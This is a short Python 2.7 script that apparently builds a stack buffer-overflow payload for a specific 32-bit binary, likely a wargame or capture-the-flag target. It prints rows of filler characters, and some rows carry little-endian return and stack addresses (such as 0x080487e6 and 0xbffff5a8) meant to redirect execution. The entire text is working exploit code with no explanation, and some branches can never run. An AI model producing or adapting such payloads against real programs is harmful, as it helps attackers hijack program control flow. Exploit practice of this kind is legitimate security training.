#!/usr/bin/python2.7
import struct

RA_FROM_CONCATENATE_FIRST_CHARS = 0x080487E6


for c in range(0x41, 0x5F):
	char_endline = chr(c+10).lower()
	if c is 0x4d:
		print("\xfd\x86" * 8)
	elif c is 0x4e:
		print("\x04\x08" * 8)
	elif c is 0x4f:
		print("\xe6\x87\x04\x08" * 2 + "\xe6\x87" * 4)
	elif c is 0x50:
		print("\x04\x08" * 8)
	elif c >= 0x51:
		print ((chr(c)*16 + chr(c+10)))
	elif c is 0x4b:
		print("\xa8\xf5" * 8)
	elif c is 0x4c:
		print("\xff\xbf" * 8)
	elif c is 0x5e:
		print("\x83\xca" * 8)
	elif c is 0x5d:
		print("\xe3\xb7" * 8)		
	else:
		print(chr(c)*16 + char_endline)
